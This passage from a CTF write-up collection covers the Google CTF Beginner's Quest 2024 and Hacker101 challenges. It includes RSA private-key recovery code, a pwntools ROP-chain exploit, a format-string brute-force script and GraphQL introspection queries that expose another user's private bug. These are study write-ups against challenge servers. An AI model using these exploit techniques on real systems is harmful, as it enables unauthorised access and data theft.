plaintext.txt</code> after you have recovered the key.</p> <p>The private key given:</p> <pre><code>-----BEGIN RSA PRIVATE KEY-----\nMIIJKQIBAAKCAgEAnUe2Sb9N9kIoN4z0PAJJShtZDjAr3ow9bzFGF/aoxfF+Rbdr\nJ0e5QjAgpIoNjVJVeFkb6LdPpAfrJga7cQH2gvFDXHAOoB4KwsJ2IdX67aGZT9A3\nz6J+ttXxrJXx1btVeM9SYdhje6SZ7bgsN5SIyqHKaeRUneiE+OLhS7YjaBY6YcVl\n4ez0bkYF7z/GbFeF1JFhlKPhnLeL958dzyb6y/G1eXggyrEakFKtfAusojHmAbIE\nJ2C7U8AIevYxpOEpMcLNwpOx+W5uajySf9HbeWnMVYu9w/tKc2eG5Sys2Lx/0alz\nHHJQfFaA+/+NfchuFuAJQv2vfqPtTBcX8wt6EdVdYTZE9PFmyAOenjnEXvlo4Jut\nUPS5x6ZEJglhq/6v/LF27oYwFzLsUoozS5C8//i0c06dgCJdb8Q7vn0D6n5P5zgT\n4O/NUVeE+e3k60ML0G6btqxjz9lb+6e+kzFDXPEbUw9miydHe1E7I+9AtVGCVNC3\nx68YTTaw9S8F7mhPES51AiO8U/zf3SUqaVLSbjSMI/O3SFmRLGOYJfa9Z+wX6mym\n6ww99oXth1hxvFVZ6BpsnJhGNNRpsTtCurmY4NoGy6KyzghZP31gfao3/kzeHA0G\n4up5RtOBpgPE8tgINfhaGUIULqLGZUY3rM1PKjVRWY4iprimn/y6XpyHYNsCAwEA\nAQKCAgAFAUKyPxW2h+1qsyAUhsgZRRyE4JCM0O6liq5d1doSDnjDtC4DPnuNOSXY\nxpHe1OdmYIOMWMT+hcf8Wkt9sZ/ME+xeVSyJ+NrDztdehUYqaLGNwiT8hQG+RLmf\nkdfzwrXaFdLbzTyBM0A4udsiW6YsuJBN5Vex/LO6jdG4jI+84LQz50myMk2m8rB+\nqAti6DgYhxXRWpOz3n1kQFp8/JMPiV4KgwGcIZ2kSRU/NMnmEWtt02HhdOkRJbO/\nYfU7d3TNohLVJckMlHCMDehli+KNjwnTERLVWTpJyNoYkd7gOMNigx9oINUh18jb\n/ApfHdEvBisVSChdAc9r0/JNqChWuyqC3yv4KI4KBwoIResB1+tpGOW72QFQVQKL\neL8ZtN6G0FXBPt8sijlrmnKHW2A8Ys/pIIo1DT1nTAZJkvGO6jvPuzmMP26YJrle\nSyy2P2nNMNyQSOta89yh9UfdDnRUon6jYNcYAPzfoXNjinmyoFMYYnZGdqbq4CJR\ngoaQ8sWeV16RlAa2U7PlvgpwvFa8+JD96aO5rCqLDggtHZ65knyyQUglrM2JXzr1\nIE3YbCNBSCBLTYxl376KI/DwIOD8t1sybAXQF2zZ8OmPdj1O9BuoKk0UGLQbWS0/\nv6KIfdf/7F9vFWdTXaSflKXpDkpAG9FMf1hFXT53dcVoauflJQ**************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n****************************************************************\n************************************************************\n-----END RSA PRIVATE KEY-----\n</code></pre> <p>Refer to this helpful blog on decrypting incomplete private key</p> <p>Using Cyberchef:</p> <p></p> <ol> <li>After first 0282, we have 0201, which indicates next 513 bytes represent the integer n</li> <li>Next, we notice 0203010001, which indicates e = 0x010001 = 65537</li> <li>After second 0282, we have 0200, which indicates next 512 bytes represent the integer d</li> </ol> <p>Find p,q from n,e,d using solution of CryptoHack's Crossed Wires</p> <pre><code>import random\nfrom Crypto.Util.number import GCD, inverse, long_to_bytes\nfrom Crypto.PublicKey import RSA\n\n\ndef find_pq(N, d, e):\n    k = d * e - 1\n    while True:\n        g = random.randint(2, N - 1)\n        t = k\n        while t % 2 == 0:\n            t //= 2\n            x = pow(g, t, N)\n            y = GCD(x - 1, N)\n            if 1 &lt; y &lt; N:\n                p = y\n                q = N // y\n                return p, q\n\nn = int('009d47b649bf4df64228378cf43c02494a1b590e302bde8c3d6f314617f6a8c5f17e45b76b2747b9423020a48a0d8d525578591be8b74fa407eb2606bb7101f682f1435c700ea01e0ac2c27621d5faeda1994fd037cfa27eb6d5f1ac95f1d5bb5578cf5261d8637ba499edb82c379488caa1ca69e4549de884f8e2e14bb62368163a61c565e1ecf46e4605ef3fc66c5785d4916194a3e19cb78bf79f1dcf26facbf1b5797820cab11a9052ad7c0baca231e601b2042760bb53c0087af631a4e12931c2cdc293b1f96e6e6a3c927fd1db7969cc558bbdc3fb4a736786e52cacd8bc7fd1a9731c72507c5680fbff8d7dc86e16e00942fdaf7ea3ed4c1717f30b7a11d55d613644f4f166c8039e9e39c45ef968e09bad50f4b9c7a644260961abfeaffcb176ee86301732ec528a334b90bcfff8b4734e9d80225d6fc43bbe7d03ea7e4fe73813e0efcd515784f9ede4eb430bd06e9bb6ac63cfd95bfba7be9331435cf11b530f668b27477b513b23ef40b5518254d0b7c7af184d36b0f52f05ee684f112e750223bc53fcdfdd252a6952d26e348c23f3b74859912c639825f6bd67ec17ea6ca6eb0c3df685ed875871bc5559e81a6c9c984634d469b13b42bab998e0da06cba2b2ce08593f7d607daa37fe4cde1c0d06e2ea7946d381a603c4f2d80835f85a1942142ea2c6654637accd4f2a3551598e22a6b8a69ffcba5e9c8760db',16)\nd = int('050142b23f15b687ed6ab3201486c819451c84e0908cd0eea58aae5dd5da120e78c3b42e033e7b8d3925d8c691ded4e76660838c58c4fe85c7fc5a4b7db19fcc13ec5e552c89f8dac3ced75e85462a68b18dc224fc8501be44b99f91d7f3c2b5da15d2dbcd3c81334038b9db225ba62cb8904de557b1fcb3ba8dd1b88c8fbce0b433e749b2324da6f2b07ea80b62e838188715d15a93b3de7d64405a7cfc930f895e0a83019c219da449153f34c9e6116b6dd361e174e91125b3bf61f53b7774cda212d525c90c94708c0de8658be28d8f09d31112d5593a49c8da1891dee038c362831f6820d521d7c8dbfc0a5f1dd12f062b1548285d01cf6bd3f24da82856bb2a82df2bf8288e0a070a0845eb01d7eb6918e5bbd9015055028b78bf19b4de86d055c13edf2c8a396b9a72875b603c62cfe9208a350d3d674c064992f18eea3bcfbb398c3f6e9826b95e4b2cb63f69cd30dc9048eb5af3dca1f547dd0e7454a27ea360d71800fcdfa173638a79b2a0531862764676a6eae02251828690f2c59e575e919406b653b3e5be0a70bc56bcf890fde9a3b9ac2a8b0e082d1d9eb9927cb2414825accd895f3af5204dd86c234148204b4d8c65dfbe8a23f0f020e0fcb75b326c05d0176cd9f0e98f763d4ef41ba82a4d1418b41b592d3fbfa2887dd7ffec5f6f1567535da49f94a5e90e4a401bd14c7f58455d3e7775c5686ae7e525',16)\ne = 65537\np, q = find_pq(n,d,e)\n\n\nkey = RSA.construct((n,e,d,p,q))\npem = key.export_key('PEM')\n\nwith open('key-recovered.pem', 'w') as f:\n    f.write(pem.decode())\n</code></pre> <pre><code>-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----\n</code></pre>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Rope%20Climb/","title":"Rope Climb","text":"<p>I heard that all you need to climb a mountain is a couple of gadgets and some rope. But the real skill is knowing where to place the gadgets along the way.</p> <p>Observations from GDB <code>disas</code>:</p> <ol> <li><code>main()</code> calls <code>vuln()</code>, which simply reads input from stdin</li> <li>There are functions <code>camp1()</code>, <code>camp2()</code>, <code>summit()</code> which are not being called in natural flow of the program. All three of these functions execute <code>fread</code> and then print the contents, possibly 3 parts of the flag. We need to construct a ROP chain.</li> <li><code>disas</code> each function to know:<ul> <li>vuln - input starts at rbp-0x30</li> <li>camp1 - takes no args</li> <li>camp2 - arg1: must be 0x67</li> <li>summit - arg1: must be 0x63, arg2: must be 0x7466</li> </ul> </li> <li><code>ROPgadget --binary ./chal</code> -&gt; addresses of required gadgets</li> </ol> <p>It's always better add a RET gadget before every function call to be safe from any stack alignment issues</p> <pre><code>from pwn import *\n\np = remote('climb.2024-bq.ctfcompetition.com',1337)\np.recvuntil(b'(Maybe some rope would help?)\\n')\n\noffset = 0x38\ncamp1 = 0x00000000004011d7\ncamp2 = 0x0000000000401253\nsummit = 0x00000000004012f3\npop_rdi_ret = 0x000000000040118a\npop_rsi_ret = 0x000000000040118c\nret = 0x0000000000401016\n\npayload = offset*b'a'\npayload += p64(ret) # Stack alignment\npayload += p64(camp1)\npayload += p64(pop_rdi_ret) + p64(0x67)\npayload += p64(ret) # Stack alignment\npayload += p64(camp2)\npayload += p64(pop_rdi_ret) + p64(0x63)\npayload += p64(pop_rsi_ret) + p64(0x7466)\npayload += p64(ret) # Stack alignment\npayload += p64(summit)\n\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"GoogleCTF%20Beginner%27s%20Quest%202024/Simple%20Echo/","title":"Simple Echo","text":"<p>A simple program to echo back user input. What could possibly go wrong?</p> <ol> <li>Using GDB, look at <code>main</code> function. It simply takes a string as input and <code>printf</code>s it. Clearly a format string vulnerability.</li> <li> <p>Brute force:</p> <p>```python from pwn import *</p> <p>for i in range(1, 100):     try:         p = remote('simple-echo.2024-bq.ctfcompetition.com', 1337)         p.recvuntil(b'Type input to be echoed: ')</p> <pre><code>    payload = f'%{i}$s'.encode()\n\n    p.sendline(payload)\n    sleep(2)\n    p.recvuntil(b'Echoed output: \\n')\n    op = p.recvline()\n    print(op, \"index:\",i)\n    p.close()\nexcept:\n    pass\n</code></pre> <p>```</p> <p>We get the flag at index 51</p> </li> </ol>"},{"location":"Hacker101-CTF/A%20little%20something%20to%20get%20you%20started/","title":"A little something to get you started","text":""},{"location":"Hacker101-CTF/A%20little%20something%20to%20get%20you%20started/#flag-0","title":"Flag 0","text":"<p>Get the source code by inspecting or curl.</p> <pre><code>curl https://xxxxxxxxxx.ctf.hacker101.com/\n</code></pre> <pre><code>.\n.\n&lt;style&gt;\n    body {\n        background-image: url(\"background.png\");\n    }\n&lt;/style&gt;\n.\n.\n</code></pre> <p>The presence of bg image for a page with white bg seems suspicious. Go to the <code>background.png</code> using browser or curl, and there's the flag.</p> <pre><code>curl https://xxxxxxxxxx.ctf.hacker101.com/background.png\n</code></pre>"},{"location":"Hacker101-CTF/BugDB%20v1/","title":"BugDB v1","text":"<p>Web, GraphQL</p> <p>An interface is given, which allows us to execute graphql queries and displays its response</p>"},{"location":"Hacker101-CTF/BugDB%20v1/#introspection-queries","title":"Introspection queries","text":""},{"location":"Hacker101-CTF/BugDB%20v1/#enumerate-available-schema-types","title":"Enumerate available schema types","text":"<pre><code>{\n  __schema {\n    types {\n      name\n      kind\n    }\n  }\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"__schema\": {\n      \"types\": [\n        {\n          \"name\": \"Query\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Node\",\n          \"kind\": \"INTERFACE\"\n        },\n        {\n          \"name\": \"ID\",\n          \"kind\": \"SCALAR\"\n        },\n        {\n          \"name\": \"UsersConnection\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"PageInfo\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Boolean\",\n          \"kind\": \"SCALAR\"\n        },\n        {\n          \"name\": \"String\",\n          \"kind\": \"SCALAR\"\n        },\n        {\n          \"name\": \"UsersEdge\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Users\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Bugs_Connection\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Bugs_Edge\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Bugs_\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Int\",\n          \"kind\": \"SCALAR\"\n        },\n        {\n          \"name\": \"BugsConnection\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"BugsEdge\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Bugs\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__Schema\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__Type\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__TypeKind\",\n          \"kind\": \"ENUM\"\n        },\n        {\n          \"name\": \"__Field\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__InputValue\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__EnumValue\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__Directive\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__DirectiveLocation\",\n          \"kind\": \"ENUM\"\n        }\n      ]\n    }\n  }\n}\n</code></pre>"},{"location":"Hacker101-CTF/BugDB%20v1/#query-discovery","title":"Query Discovery","text":"<pre><code>{\n  __schema {\n    queryType {\n      fields {\n        name\n        args {\n          name\n          type {\n            name\n            kind\n            ofType {\n              name\n              kind\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"__schema\": {\n      \"queryType\": {\n        \"fields\": [\n          {\n            \"name\": \"node\",\n            \"args\": [\n              {\n                \"name\": \"id\",\n                \"type\": {\n                  \"name\": null,\n                  \"kind\": \"NON_NULL\",\n                  \"ofType\": {\n                    \"name\": \"ID\",\n                    \"kind\": \"SCALAR\"\n                  }\n                }\n              }\n            ]\n          },\n          {\n            \"name\": \"user\",\n            \"args\": [\n              {\n                \"name\": \"before\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"after\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"first\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"last\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              }\n            ]\n          },\n          {\n            \"name\": \"bug\",\n            \"args\": [\n              {\n                \"name\": \"before\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"after\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"first\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"last\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              }\n            ]\n          },\n          {\n            \"name\": \"findUser\",\n            \"args\": [\n              {\n                \"name\": \"username\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              }\n            ]\n          },\n          {\n            \"name\": \"findBug\",\n            \"args\": [\n              {\n                \"name\": \"_\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              }\n            ]\n          },\n          {\n            \"name\": \"allUsers\",\n            \"args\": [\n              {\n                \"name\": \"before\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"after\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"first\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"last\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              }\n            ]\n          },\n          {\n            \"name\": \"allBugs\",\n            \"args\": [\n              {\n                \"name\": \"before\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"after\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"first\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"last\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              }\n            ]\n          }\n        ]\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"Hacker101-CTF/BugDB%20v1/#enumerate-the-fields-of-a-type-and-their-nested-type-information","title":"Enumerate the fields of a type and their nested type information","text":"<pre><code>{\n  __type(name: \"Bugs_\") {\n    name\n    fields {\n      name\n      type {\n        name\n        kind\n        ofType {\n          name\n          kind\n        }\n      }\n    }\n  }\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"__type\": {\n      \"name\": \"Bugs_\",\n      \"fields\": [\n        {\n          \"name\": \"id\",\n          \"type\": {\n            \"name\": null,\n            \"kind\": \"NON_NULL\",\n            \"ofType\": {\n              \"name\": \"ID\",\n              \"kind\": \"SCALAR\"\n            }\n          }\n        },\n        {\n          \"name\": \"reporterId\",\n          \"type\": {\n            \"name\": \"Int\",\n            \"kind\": \"SCALAR\",\n            \"ofType\": null\n          }\n        },\n        {\n          \"name\": \"text\",\n          \"type\": {\n            \"name\": \"String\",\n            \"kind\": \"SCALAR\",\n            \"ofType\": null\n          }\n        },\n        {\n          \"name\": \"private\",\n          \"type\": {\n            \"name\": \"Boolean\",\n            \"kind\": \"SCALAR\",\n            \"ofType\": null\n          }\n        },\n        {\n          \"name\": \"reporter\",\n          \"type\": {\n            \"name\": \"Users\",\n            \"kind\": \"OBJECT\",\n            \"ofType\": null\n          }\n        }\n      ]\n    }\n  }\n}\n</code></pre>"},{"location":"Hacker101-CTF/BugDB%20v1/#what-to-do","title":"What to do","text":"<p>The <code>text</code> field in <code>Bugs_</code> seems interesting, but the <code>allBugs()</code> function returns <code>BugsConnection</code>, not <code>Bugs_</code>:</p> <pre><code>query {\n  allBugs(first: 10) {\n    edges {\n      node {\n        id\n        reporterId\n        private\n        reporter {\n          id\n          username\n        }\n      }\n    }\n  }\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"allBugs\": {\n      \"edges\": [\n        {\n          \"node\": {\n            \"id\": \"QnVnczox\",\n            \"reporterId\": 1,\n            \"private\": false,\n            \"reporter\": {\n              \"id\": \"VXNlcnM6MQ==\",\n              \"username\": \"admin\"\n            }\n          }\n        },\n        {\n          \"node\": {\n            \"id\": \"QnVnczoy\",\n            \"reporterId\": 2,\n            \"private\": true,\n            \"reporter\": {\n              \"id\": \"VXNlcnM6Mg==\",\n              \"username\": \"victim\"\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n</code></pre> <p>Base64-decoding the strings doesn't yield useful information. <code>findBug</code> function returns <code>Bugs_</code> object but its expected argument is not known; we need to find some other way to get a <code>Bugs_</code> object in response</p> <p>On introspecting fields of various schemas:</p> <pre><code>UsersConnection\n    - UsersEdge\n        - Users\n            - Bugs_Connection\n                - Bugs_Edge\n                 - Bugs_\n</code></pre> <pre><code>query {\n  allUsers(first: 2) {\n    edges {\n      node {\n        id\n        username\n        bugs {\n          edges {\n            node {\n              id\n              reporterId\n              text\n              private\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"allUsers\": {\n      \"edges\": [\n        {\n          \"node\": {\n            \"id\": \"VXNlcnM6MQ==\",\n            \"username\": \"admin\",\n            \"bugs\": {\n              \"edges\": [\n                {\n                  \"node\": {\n                    \"id\": \"QnVnc186MQ==\",\n                    \"reporterId\": 1,\n                    \"text\": \"This is an example bug\",\n                    \"private\": false\n                  }\n                }\n              ]\n            }\n          }\n        },\n        {\n          \"node\": {\n            \"id\": \"VXNlcnM6Mg==\",\n            \"username\": \"victim\",\n            \"bugs\": {\n              \"edges\": [\n                {\n                  \"node\": {\n                    \"id\": \"QnVnc186Mg==\",\n                    \"reporterId\": 2,\n                    \"text\": \"^FLAG^51e11eedd191aca15d86bb580c57fc3f15c48c43f58ceed600a37bd6d46058a7$FLAG$\",\n                    \"private\": true\n                  }\n                }\n              ]\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n</code></pre>"},{"location":"Hacker101-CTF/BugDB%20v2/","title":"BugDB v2","text":"<p>Web, GraphQL</p> <p>Sequel to v1</p>"},{"location":"Hacker101-CTF/BugDB%20v2/#introspection-queries","title":"Introspection queries","text":""},{"location":"Hacker101-CTF/BugDB%20v2/#enumerate-available-schema-types","title":"Enumerate available schema types","text":"<pre><code>{\n  __schema {\n    types {\n      name\n      kind\n    }\n  }\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"__schema\": {\n      \"types\": [\n        {\n          \"name\": \"Query\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Node\",\n          \"kind\": \"INTERFACE\"\n        },\n        {\n          \"name\": \"ID\",\n          \"kind\": \"SCALAR\"\n        },\n        {\n          \"name\": \"UsersConnection\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"PageInfo\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Boolean\",\n          \"kind\": \"SCALAR\"\n        },\n        {\n          \"name\": \"String\",\n          \"kind\": \"SCALAR\"\n        },\n        {\n          \"name\": \"UsersEdge\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Users\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"Int\",\n          \"kind\": \"SCALAR\"\n        },\n        {\n          \"name\": \"Bugs\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"MyMutations\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"modifyBug\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__Schema\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__Type\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__TypeKind\",\n          \"kind\": \"ENUM\"\n        },\n        {\n          \"name\": \"__Field\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__InputValue\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__EnumValue\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__Directive\",\n          \"kind\": \"OBJECT\"\n        },\n        {\n          \"name\": \"__DirectiveLocation\",\n          \"kind\": \"ENUM\"\n        }\n      ]\n    }\n  }\n}\n</code></pre> <p>We have some mutations this time...interesting</p>"},{"location":"Hacker101-CTF/BugDB%20v2/#query-discovery","title":"Query Discovery","text":"<pre><code>{\n  __schema {\n    queryType {\n      fields {\n        name\n        args {\n          name\n          type {\n            name\n            kind\n            ofType {\n              name\n              kind\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"__schema\": {\n      \"queryType\": {\n        \"fields\": [\n          {\n            \"name\": \"node\",\n            \"args\": [\n              {\n                \"name\": \"id\",\n                \"type\": {\n                  \"name\": null,\n                  